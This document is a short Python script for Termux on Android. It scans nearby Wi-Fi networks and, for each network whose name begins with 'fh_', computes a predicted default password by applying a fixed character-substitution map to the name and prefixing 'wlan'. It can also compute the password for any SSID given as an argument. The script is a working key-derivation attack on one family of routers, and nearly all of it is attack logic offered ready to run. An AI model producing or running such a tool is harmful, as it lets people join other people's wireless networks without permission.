import subprocess
import json
import sys

# ANSI Color Codes for beautiful output
RESET = "\033[0m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
BLUE = "\033[94m"

# Character substitution mapping based on your scheme
TRANS_MAP = {
    '6': '9', '9': '6',
    '7': '8', '8': '7',
    '0': 'f', 'f': '0',
    '1': 'e', 'e': '1',
    '2': 'd', 'd': '2',
    '5': 'a', 'a': '5',
    '4': 'b', 'b': '4',
    '3': 'c', 'c': '3'
}

def generate_password(ssid):
    if not ssid.startswith("fh_"):
        return None
    
    suffix = ssid[3:]
    transformed_suffix = "".join(TRANS_MAP.get(c, c) for c in suffix)
    return "wlan" + transformed_suffix

def scan_networks():
    try:
        result = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, check=True)
        return json.loads(result.stdout)
    except Exception as e:
        print(f"{RED}[-] Error scanning networks: {e}{RESET}")
        print(f"{YELLOW}[!] Make sure Termux:API app is installed, location permission is granted, and GPS is turned ON.{RESET}")
        return []

def main():
    # Check if user provided an SSID as a command-line argument (e.g., python wifi_script.py fh_12345)
    if len(sys.argv) > 1:
        target_ssid = sys.argv[1]
        print(f"{CYAN}[*] Processing target SSID: {BLUE}{target_ssid}{RESET}")
        password = generate_password(target_ssid)
        if password:
            print(f"{GREEN}[+] Generated Password: {YELLOW}{password}{RESET}")
        else:
            print(f"{RED}[-] Error: SSID must start with 'fh_'{RESET}")
        return

    # Otherwise, run the local scanner
    print(f"{CYAN}[*] Scanning for Wi-Fi networks starting with 'fh_'...{RESET}")
    networks = scan_networks()
    
    if not networks:
        print(f"{RED}[-] No networks found or scan returned empty.{RESET}")
        return

    found = False
    for net in networks:
        ssid = net.get("SSID", "") or net.get("ssid", "")
        if ssid.startswith("fh_"):
            found = True
            password = generate_password(ssid)
            print(f"\n{GREEN}[+] Found Network: {BLUE}{ssid}{RESET}")
            print(f"{GREEN}[+] Password:    {YELLOW}{password}{RESET}")
                
    if not found:
        print(f"{YELLOW}[-] No networks starting with 'fh_' were found in the current range.{RESET}")
    else:
        print(f"\n{CYAN}[*] Scan complete.{RESET}")

if __name__ == "__main__":
    main()